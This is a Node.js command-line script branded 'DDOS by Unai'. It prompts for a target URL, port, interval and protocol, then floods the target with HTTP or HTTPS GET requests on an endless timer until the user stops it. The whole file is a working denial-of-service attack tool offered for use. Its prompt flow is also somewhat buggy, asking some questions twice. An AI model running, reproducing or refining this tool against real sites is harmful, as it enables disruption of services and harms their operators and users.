const readline = require("readline");
const rl = readline.createInterface({
	    input: process.stdin,
	    output: process.stdout
});
const https = require("https");
const http = require("http");
let requests = 0;
let imprimir = 10;
let error_;
let msg = `
-------------------------------
	  DDOS by Unai

Follow me on Instagram: unaii_m
-------------------------------
`;
function httpsdos(url_, intensidad, port){
	var options = {
		        hostname: url_,
			method: 'GET',
		}
	if(port !== ""){
		options.port = port
	}
	console.log(`Starting dos to ${options.hostname}${port}`)
	let interval = setInterval(function(){
		const req = https.request(options, res => {
			requests++;
			if(requests === imprimir){
				console.log(`(${imprimir}) Requests send it! Status: ${res.statusCode}`);
	        		imprimir = imprimir + 10;
			}
		})
		req.on('error', error => {
			error_ = error;
			console.log("An error ocurred sending request, press ctrl+C to finish dos atack!")
			// return clearInterval(interval);
	        })
		req.end()
	}, intensidad)
}
function httpdos(url_, intensidad, port){
	var options = {
		hostname: url_,
		method: 'GET'
	}
	if(port !== ""){
		options.port = port;
		console.log(`Starting dos to ${options.hostname}:${options.port}`);
	}else {
     		console.log(`Starting dos to ${options.hostname}`)
	}
	let interval = setInterval(function(){ 
		const req = http.request(options, res => { 
			requests++; 
			if(requests === imprimir){ 
				console.log(`(${imprimir}) Requests send it! Status: ${res.statusCode}`); 
		                imprimir = imprimir + 10; 
		        } 
		}) 
	        req.on('error', error => { 
			error_ = error;
			console.log("An error ocurred sending the request, press ctrl+C to finish dos atack!"); 
			// return clearInterval(interval);
		})
		req.end()
	}, intensidad)				
}
console.log(msg);
rl.question("Url: ", function(url){
	rl.question("You want to put a port?(y/n): ", function(qport){
		let next = "no";
		let port_;
		if(qport === "y"){
			rl.question("Port: ", function(port){
				next = "yes";
				port_ = port;
				rl.question("Intensidad(ms): ", function(intensidad){ 
					rl.question("(1)http | (2)https: ", function(number){
						if(number === "1"){
							httpdos(url, intensidad, port_);
						}
						else if(number === "2"){
							httpsdos(url, intensidad, port_);
						}
					})
				})
			})
		}else if(qport === "n"){
			port_ = "";
		}else{
			console.log("Not valid answer, press ctrl+C to exit")
			return;
		}
		rl.question("Intensidad(ms): ", function(intensidad){			
				rl.question("(1)http | (2)https: ", function(number){
					if(number === "1"){
						httpdos(url, intensidad, port_);
					}
					else if(number === "2"){
						httpsdos(url, intensidad, port_);
					}
				})
			})
		})
})
